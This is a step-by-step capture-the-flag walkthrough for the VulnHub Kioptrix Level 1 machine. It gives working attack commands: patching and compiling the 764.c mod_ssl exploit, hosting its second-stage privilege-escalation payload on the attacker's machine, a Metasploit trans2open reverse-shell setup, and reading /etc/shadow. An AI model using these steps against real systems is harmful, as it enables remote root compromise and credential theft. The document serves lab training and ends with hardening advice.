# Kioptrix: Level 1 CTF — Video-Based Walkthrough

This guide follows, **step by step**, the methodology of a video walkthrough for the **Kioptrix: Level 1 (#1)** machine from VulnHub. Rather than a simple "flag hunt," it emphasizes the **mindset of a real penetration test**, namely the search for weaknesses in the target's **services**, as well as a topic that makes Kioptrix 1 particularly instructive: **patching and compiling an outdated exploit** so that it runs on a modern Kali Linux installation.

> - **VM:** [VulnHub — Kioptrix: Level 1 (#1)](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
> - **Category:** Boot-to-Root, Difficulty: Beginner (OSCP-like)
> - **Objective:** obtain **root** by any means (there is no flag file; the proof is `uid=0`).

#### **Caution! All IP addresses in these instructions are examples only. Here the target appears as `192.168.1.106`, but DHCP assigns different addresses in every environment. Adapt each command to your own network rather than executing it verbatim.**

---

## A Note on the Screenshots

This walkthrough is illustrated with **representative terminal screenshots** that depict the expected output of each stage. They are neither frames from the video nor captures of a live target; they are **representative screens** intended to help the reader follow the workflow. The exact banners, hashes, and addresses will differ in your own environment.

---

## The Philosophy: "Look for Weaknesses, Not Flags"

Kioptrix is a series of virtual machines designed to simulate **realistic** penetration testing scenarios, and they are frequently recommended as preparation for certifications such as the **OSCP**. The goal is not to collect flags but to achieve **complete compromise of the system (root)** by exploiting its exposed services.

**What Kioptrix 1 teaches:**

* **Service enumeration** — mapping ports and exact versions (Nmap), and SMB enumeration (`enum4linux`, `rpcclient`).
* **Recognizing rabbit holes** — not every open service leads to root; the web server here is a decoy.
* **Mapping versions to exploits** (`searchsploit`) on the basis of service banners.
* **Exploit maintenance** — the most important skill in this lab: **patching and compiling** an outdated exploit so that it builds and runs today.

---

## Methodology (PTES)

```
[ Reconnaissance ]  →  discover IP (netdiscover) & open ports (Nmap)
        │
        ▼
[ Enumeration ]     →  enum4linux / rpcclient (SMB), dirb (web), searchsploit
        │
        ▼
[ Vuln Analysis ]   →  Apache mod_ssl 2.8.4 < 2.8.7  (CVE-2002-0082)
        │
        ▼
[ Exploitation ]    →  patch + compile "OpenFuck" (764.c) → remote root
        │
        ▼
[ Post-exploit ]    →  confirm uid=0(root)  &  hardening notes
```

---

## Target Information

* **Target Name:** Kioptrix: Level 1 (#1)
* **Platform:** VulnHub
* **Operating System:** Red Hat Linux (kernel 2.4.x), circa 2001
* **Attacking Machine:** Kali Linux
* **Primary attack vector:** `Apache 1.3.20` + `mod_ssl 2.8.4` (ports 80/443)
* **Alternative vector:** `Samba` (port 139) — see the [Appendix](#alternative-path-samba-trans2open)

---

## Step 0: Preparation & Network Check

Before any attack, we locate the target on the local subnet. `netdiscover` sends ARP requests and reveals the active hosts:

```bash
ip addr show                      # our own IP / subnet
sudo netdiscover -r 192.168.1.0/24   # or: sudo arp-scan -l
ping -c 4 192.168.1.106           # connectivity check
```

![netdiscover — locating the target on the local network](../../07.%20Kioptrix/images/01-netdiscover.png)

*Figure 1 — `netdiscover` locates the target at `192.168.1.106`. The first three bytes of the MAC address (the OUI) reveal the hypervisor, e.g. `00:0c:29` / `00:50:56` for VMware and `08:00:27` for VirtualBox.*

---

## Step 1: Reconnaissance — Port Scanning (Nmap)

We run a scan with service/version detection and aggressive mode enabled. Accurate identification of **versions** is critical, because the machine is so old that the version of each service leads directly to known CVEs:

```bash
sudo nmap -sV -A -T4 192.168.1.106
```

### Command Breakdown

* **`-sV`** — Service/version detection (banner grabbing): the exact version of each service.
* **`-A`** — Aggressive mode: OS detection, version detection, default NSE scripts, and traceroute.
* **`-T4`** — aggressive timing, appropriate for a stable local lab.

![Nmap scan results showing the open ports](../../07.%20Kioptrix/images/02-nmap.png)

*Figure 2 — Nmap: ports 22 (ssh), 80 (http), 111 (rpcbind), 139 (samba), 443 (ssl/https), and 32768 (status) are open.*

### Identified Open Ports

| Port / Protocol | Service | Version | Remarks |
| :--- | :--- | :--- | :--- |
| **`22/tcp`** | **ssh** | OpenSSH 2.9p2 | Very old, but without a practical remote exploit. |
| **`80/tcp`** | **http** | Apache 1.3.20 + mod_ssl/2.8.4 | **The primary target** (via mod_ssl). |
| **`111/tcp`** | **rpcbind** | RPC portmapper | Lists the registered RPC services. |
| **`139/tcp`** | **netbios-ssn** | Samba | Permits a null session; **alternative path**. |
| **`443/tcp`** | **ssl/https** | Apache 1.3.20 + mod_ssl/2.8.4 | The SSL side of the same vulnerable web server. |
| **`32768/tcp`** | **status** | RPC status (rpc.statd) | Historically vulnerable, but a rabbit hole here. |

> **Observation:** The Apache banner simultaneously reveals **three** key pieces of information: `Apache/1.3.20`, `mod_ssl/2.8.4`, and `OpenSSL/0.9.6b`. Keep them in mind; they will be needed both for matching the exploit and for selecting the correct offset.

---

## Step 2: SMB Enumeration (enum4linux / rpcclient)

With ports 139/111 open, it is worth enumerating Samba. `enum4linux` attempts a **null session** (empty username/password) and gathers information about users, groups, and shares:

```bash
enum4linux -a 192.168.1.106
```

![enum4linux — null session against Samba](../../07.%20Kioptrix/images/03-enum4linux.png)

*Figure 3 — The server permits a session with empty credentials (null session), but **the Samba version is not disclosed** in the banner.*

We confirm the null session manually with `rpcclient`:

```bash
rpcclient -U "" -N 192.168.1.106
rpcclient $> enumdomusers      # attempt to enumerate users
rpcclient $> srvinfo
```

> **Conclusion:** A null session is available, but the user enumeration commands return nothing of use, and **the Samba version remains hidden**. This does not mean that Samba is secure; it simply means that a different approach will be required (see the alternative path). For now, we turn our attention to the web server.

---

## Step 3: Examining the Web Server & Directory Fuzzing

We open `http://192.168.1.106/` and `https://192.168.1.106/` in a browser: the **default Apache "Test Page"** is displayed, indicating that no real application is hosted. The standard initial checks are:

```bash
curl -s http://192.168.1.106/robots.txt     # here: nothing
dirb http://192.168.1.106/                   # content discovery
nikto -h http://192.168.1.106                # known web vulnerabilities
```

![dirb — directory discovery on the web server](../../07.%20Kioptrix/images/04-dirb.png)

*Figure 4 — `dirb` returns only the standard `cgi-bin/`, `manual/`, `mrtg/`, and `usage/` directories of a default Apache installation.*

> **Rabbit hole:** The web server **hosts no application** worth exploiting; it is there to keep you busy. The actual vulnerability does not lie *within* the site but in the **software that serves it**: `mod_ssl 2.8.4`.

---

## Step 4: Vulnerability Analysis — Exploit Matching

We use `searchsploit` to check the versions identified by Nmap. OpenSSH 2.9 and Apache 1.3.20 yield nothing immediately usable, but **`mod_ssl < 2.8.7`** yields the classic remote buffer overflow:

```bash
searchsploit openssh 2.9          # → nothing practical
searchsploit apache 1.3.20        # → mostly directory traversal (rabbit hole)
searchsploit mod_ssl 2.8          # → the one we want
```

![searchsploit — locating the mod_ssl exploit](../../07.%20Kioptrix/images/05-searchsploit.png)

*Figure 5 — `mod_ssl < 2.8.7 OpenSSL Remote Buffer Overflow` (known as "OpenFuck" / "OpenFuckV2"), path `unix/remote/764.c`.*

The vulnerability corresponds to **CVE-2002-0082** (a heap overflow in `mod_ssl` during handling of the SSL handshake). The target's version is `2.8.4`, which is **lower** than `2.8.7`, and therefore vulnerable. We copy the code locally:

```bash
searchsploit -m unix/remote/764.c
```

---

## Step 5: The Key to the Lab — Patching & Compilation

This is where the real educational value of Kioptrix 1 lies. The `764.c` code was written roughly 20 years ago and **does not compile as-is** on a modern Kali system: it references outdated OpenSSL headers and downloads its second stage (`ptrace-kmod.c`) from a **dead URL**.

### 5.1 Installing the Required Libraries

The exploit links against the OpenSSL library (`-lcrypto`), so the development headers are required:

```bash
sudo apt-get update
sudo apt-get install -y libssl-dev
```

### 5.2 Required Modifications to `764.c`

We open the file (`nano 764.c`) and make three changes:

1. **Add headers** next to the existing `#include <openssl/...>` lines:

   ```c
   #include <openssl/rc4.h>
   #include <openssl/md5.h>
   #include <string.h>
   #include <stdlib.h>
   ```

2. **Replace the dead wget URL** that downloads `ptrace-kmod.c`. Locate the line containing `wget ...ptrace-kmod.c` and point it to a **working** mirror of the payload (or serve it locally; see the note below).

3. **Save** and exit.

### 5.3 Compilation

```bash
gcc -o OpenFuck 764.c -lcrypto
```

![gcc — installing libssl-dev and successful compilation](../../07.%20Kioptrix/images/06-compile.png)

*Figure 6 — Compilation completes. Warnings such as `incompatible pointer type` are **expected** (legacy code) and do not prevent the `OpenFuck` executable from being produced.*

> **Note on the payload (`ptrace-kmod.c`):** After the initial overflow, the exploit downloads and compiles a second, local privilege escalation exploit *on the target*. If the original URL is dead, the most reliable solution is to **serve** `ptrace-kmod.c` **yourself** from the attacking machine (e.g. `python3 -m http.server 80` in its directory) and point the wget command inside `764.c` to that location.

---

## Step 6: Offset Selection & Execution

Running the executable without arguments displays the table of **supported offsets** (one for each combination of distribution and Apache version). We must select the one that matches the Nmap banner:

```bash
./OpenFuck
```

![OpenFuck — table of supported offsets](../../07.%20Kioptrix/images/07-offsets.png)

*Figure 7 — We look for the `RedHat Linux 7.2 (apache-1.3.20)` entry. In practice, offset **`0x6b`** works (the second variant; `0x6a` frequently fails).*

### Executing the Attack

The syntax is `./OpenFuck <offset> <target> [-c <connections>]`. The `-c` option specifies how many parallel SSL connections are opened in order to "groom" the heap; a value of **50** is reliable:

```bash
./OpenFuck 0x6b 192.168.1.106 -c 50
```

![OpenFuck — successful exploitation and root shell](../../07.%20Kioptrix/images/08-root.png)

*Figure 8 — After the SSL connection is established and the shellcode is sent, the second stage (`ptrace-kmod`) is compiled on the target and we obtain a **root shell**: `uid=0(root)`.*

### Analysis of the Exploitation Chain

1. **Heap overflow in `mod_ssl`** (CVE-2002-0082) during the SSLv2 handshake → remote code execution as the `apache` user.
2. The shellcode **downloads and compiles** `ptrace-kmod.c` on the target (a local privilege escalation that abuses `ptrace`/kmod in kernel 2.4).
3. The second stage elevates the shell from `apache` to **`root`**.

---

## Step 7: Confirmation (Post-exploitation)

There is no flag file; proof of compromise is root privileges:

```bash
id             # uid=0(root) gid=0(root)
uname -a       # Linux kioptrix.level1 2.4.7-10 ...
whoami         # root
cat /etc/shadow | head   # access to the password hashes of all users
```

At this point, an attacker would have **full control** of the system: reading and modifying any file, extracting credentials (`/etc/shadow`), installing persistence, and pivoting to the rest of the network.

---

## Alternative Path: Samba (trans2open)

Kioptrix 1 can be solved in **more than one** way. Beyond `mod_ssl`, port **139 (Samba)** is also vulnerable: older Samba versions (`< 2.2.8a`) suffer from the **trans2open buffer overflow** (CVE-2003-0201), which likewise yields root directly.

```bash
# Via Metasploit (for illustration):
msfconsole -q
use exploit/linux/samba/trans2open
set RHOSTS 192.168.1.106
set payload linux/x86/shell_reverse_tcp
set LHOST <KALI_IP>
run
```

> Although `enum4linux` did not reveal the Samba version, trans2open often succeeds "blind" owing to the wide range of versions it covers. This makes for a useful comparative exercise: **two independent services, two independent paths to root.**

---

## Attack Summary

| Stage | Tool / Technique | Result |
| :--- | :--- | :--- |
| **Discovery** | `netdiscover` | Target located (`192.168.1.106`) |
| **Scanning** | `nmap -sV -A` | Ports 22/80/111/139/443/32768, Apache 1.3.20 + mod_ssl 2.8.4 |
| **Enumeration** | `enum4linux`, `rpcclient`, `dirb` | Null session; web server = rabbit hole |
| **Vuln analysis** | `searchsploit mod_ssl 2.8` | CVE-2002-0082 (`764.c` / OpenFuck) |
| **Exploit prep** | `libssl-dev`, patch headers + wget URL, `gcc -lcrypto` | Working `OpenFuck` executable |
| **Exploitation** | `./OpenFuck 0x6b <ip> -c 50` | **Root shell** (`uid=0`) |

---

## Remediation Measures (Hardening)

| Weakness | Countermeasure |
| :--- | :--- |
| Vulnerable `mod_ssl 2.8.4` / `OpenSSL 0.9.6b` | Upgrade to supported versions; establish regular patch management |
| Obsolete operating system (Red Hat, kernel 2.4) | Replace with a supported distribution; retire end-of-life systems |
| Samba with null session & outdated version | Upgrade Samba, set `restrict anonymous`, remove unnecessary SMB |
| Exposure of unnecessary services (rpcbind, status) | Principle of minimal attack surface, firewall, disable unused services |
| Version disclosure in banners | Hide/minimize banners (`ServerTokens Prod`, `ServerSignature Off`) |

---

## Key Takeaways

* Think like a penetration tester: **look for weaknesses in services, not for flags**.
* The **exact version** of a service (its banner) is often all you need to find the exploit.
* Do not get trapped in **rabbit holes**; the web server here is a pure decoy.
* Old exploits **still work**, provided you know how to **update and compile** them; this is the most transferable skill in this lab.
* There is almost always **more than one** path to root.
